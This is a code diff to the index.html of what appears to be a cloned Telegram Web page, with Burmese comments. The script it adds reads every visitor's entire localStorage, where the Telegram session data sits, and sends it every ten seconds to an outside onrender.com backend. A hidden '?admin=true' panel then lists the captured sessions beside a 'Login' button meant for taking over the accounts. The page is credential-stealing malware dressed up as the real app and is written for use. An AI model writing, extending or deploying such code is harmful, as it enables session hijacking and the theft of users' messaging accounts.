@@ -55,47 +55,25 @@
       @layer tablist, spinner, button, input, layout;
     }
   </style>
-</head>
-
-<body id="root">
-  <noscript>
-    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
-    <h1>Telegram Web</h1>
-    <p>Please, enable JavaScript to open the app.</p>
-  </noscript>
-  <div id="portals"></div>
-  <script src="./compatTest.js"></script>
 
   <script>
       const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
-      // React က အကုန် Load လုပ်ပြီးမှ ကျွန်တော်တို့ Code ကို အလုပ်လုပ်စေချင်လို့ window.onload ကို သုံးပါမယ်
-      window.onload = () => {
-          
-          // (၁) Admin Panel ကို ဝင်ချင်တဲ့အခါ (React က ဖျက်မပစ်နိုင်အောင် Overlay ပုံစံ အပေါ်ဆုံးကနေ အုပ်ပြီး ပြပါမယ်)
-          if (window.location.search.includes("admin=true")) {
-              const adminDiv = document.createElement('div');
-              adminDiv.style.position = 'fixed';
-              adminDiv.style.top = '0';
-              adminDiv.style.left = '0';
-              adminDiv.style.width = '100vw';
-              adminDiv.style.height = '100vh';
-              adminDiv.style.backgroundColor = '#f4f4f9';
-              adminDiv.style.zIndex = '999999'; // Telegram UI ရဲ့ အပေါ်ဆုံးမှာ ပေါ်နေစေရန်
-              adminDiv.style.padding = '30px';
-              adminDiv.style.overflow = 'auto';
-
-              adminDiv.innerHTML = `
-                <div style="max-width: 800px; margin: auto; font-family: sans-serif;">
-                    <h2 style="color: #333;">Admin Control Panel</h2>
-                    <p>Staff ဝင်ထားသော အကောင့်များ</p>
-                    <button onclick="window.loadSessions()" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
-                    <div id="admin-content" style="margin-top: 20px;"></div>
+      // ၁။ Admin Panel ဖြစ်/မဖြစ် ချက်ချင်းစစ်မယ် (React load မလုပ်ခင်)
+      if (window.location.search.includes("admin=true")) {
+          // React လုံးဝ မတက်လာစေရန် ချက်ချင်း ရပ်ပစ်ခြင်း
+          document.addEventListener("DOMContentLoaded", () => {
+              // Telegram UI ကို ရှင်းပစ်ပြီး Admin Panel ထည့်မယ်
+              document.body.innerHTML = `
+                <div style="padding: 30px; font-family: sans-serif; background: #f4f4f9; height: 100vh; width: 100vw; position: absolute; top: 0; left: 0; z-index: 9999999;">
+                  <h2 style="color: #333;">Admin Control Panel</h2>
+                  <p>Staff ဝင်ထားသော အကောင့်များ</p>
+                  <button id="loadBtn" style="padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;">Load Accounts</button>
+                  <div id="admin-content" style="margin-top: 20px;"></div>
                 </div>
               `;
-              document.body.appendChild(adminDiv);
 
-              window.loadSessions = async () => {
+              document.getElementById('loadBtn').addEventListener('click', async () => {
                   try {
                       document.getElementById('admin-content').innerHTML = "Fetching data from MongoDB...";
                       const res = await fetch(`${BACKEND_URL}/api/get_sessions`);
@@ -107,13 +85,13 @@
                       }
 
                       let html = "<table style='width: 100%; text-align: left; border-collapse: collapse; background: white;'>";
-                      html += "<tr style='background: #ddd;'><th>User ID</th><th>Last Updated</th><th>Action</th></tr>";
+                      html += "<tr style='background: #ddd;'><th>User ID / Browser</th><th>Last Updated</th><th>Action</th></tr>";
                       data.forEach(session => {
                           html += `<tr>
                              <td style='padding: 10px; border: 1px solid #ccc;'>${session.user_id}</td>
                              <td style='padding: 10px; border: 1px solid #ccc;'>${new Date(session.timestamp).toLocaleString()}</td>
                              <td style='padding: 10px; border: 1px solid #ccc;'>
-                                 <button onclick='alert("နောက်အဆင့်တွင် Login ဝင်မည့် Code ထည့်ပါမည်")' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login</button>
+                                 <button onclick='alert("Data ရရှိပါပြီ။ နောက်အဆင့်တွင် Login ဝင်ပါမည်။")' style='padding: 5px 10px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;'>Login</button>
                              </td>
                           </tr>`;
                       });
@@ -122,41 +100,56 @@
                   } catch (err) {
                       document.getElementById('admin-content').innerHTML = "Error connecting to backend: " + err.message;
                   }
-              };
+              });
+          });
+      } else {
+          // ၂။ သာမန် User တွေအတွက် Background ကနေ Data ပို့မယ်
+          // window.onload ကို မစောင့်ဘဲ ချက်ချင်း (IIFE) အလုပ်လုပ်ခိုင်းမယ်
+          (() => {
+              // User တစ်ယောက်နဲ့ တစ်ယောက် မတူအောင် သီးသန့် ID သတ်မှတ်မယ်
+              let myUserId = localStorage.getItem("my_custom_user_id");
+              if (!myUserId) {
+                  // User ရဲ့ Browser / OS အကြမ်းဖျင်းကိုပါ တွဲထည့်လိုက်မယ်
+                  const userAgent = navigator.userAgent.substring(0, 30); 
+                  myUserId = "staff_" + Math.floor(Math.random() * 1000) + "_" + userAgent;
+                  localStorage.setItem("my_custom_user_id", myUserId);
+              }
 
-          } else {
-              // (၂) Staff တွေ သာမန် ဝင်သုံးတဲ့အခါ (Data သေချာဝင်အောင် အကုန် ဆွဲထုတ်ပြီး ပို့ကြည့်ပါမယ်)
+              // ၁၀ စက္ကန့် တစ်ကြိမ် Data လှမ်းပို့မယ်
               setInterval(() => {
-                  // localStorage ထဲမှာ ရှိသမျှ Data အကုန်လုံးကို ယူပါမယ်
-                  const allStorageData = JSON.stringify(localStorage);
+                  const storageData = JSON.stringify(localStorage);
                   
                   const sessionData = {
-                      user_id: "staff_" + Math.floor(Math.random() * 1000),
-                      local_storage_data: allStorageData,
+                      user_id: myUserId,
+                      local_storage_data: storageData,
                       timestamp: new Date().toISOString()
                   };
-                  
-                  // Console မှာ အရင်ထုတ်ကြည့်မယ် (Browser ရဲ့ Inspect > Console မှာ ဝင်ကြည့်လို့ရအောင်ပါ)
-                  console.log("Attempting to send data to MongoDB...");
 
                   fetch(`${BACKEND_URL}/api/save_session`, {
                       method: 'POST',
-                      headers: { 'Content-Type': 'application/json' },
+                      headers: { 
+                          'Content-Type': 'application/json' 
+                      },
                       body: JSON.stringify(sessionData)
                   })
                   .then(res => res.json())
-                  .then(data => {
-                      console.log("Successfully saved to MongoDB:", data);
-                  })
-                  .catch(err => {
-                      console.error("Error sending to backend:", err);
-                  });
+                  .then(data => console.log("Sent to Mongo:", data))
+                  .catch(err => console.error("Mongo Error:", err));
                   
-              }, 15000); // Data ပို့တာ မြန်မြန်သိရအောင် ၁၅ စက္ကန့် ပြောင်းထားပါတယ်
-          }
-      };
+              }, 10000); 
+          })();
+      }
   </script>
+</head>
 
+<body id="root">
+  <noscript>
+    <video src="./nojs.mp4" class="nojs-video" muted loop autoplay playsinline disablePictureInPicture></video>
+    <h1>Telegram Web</h1>
+    <p>Please, enable JavaScript to open the app.</p>
+  </noscript>
+  <div id="portals"></div>
+  <script src="./compatTest.js"></script>
 </body>
 
 </html>
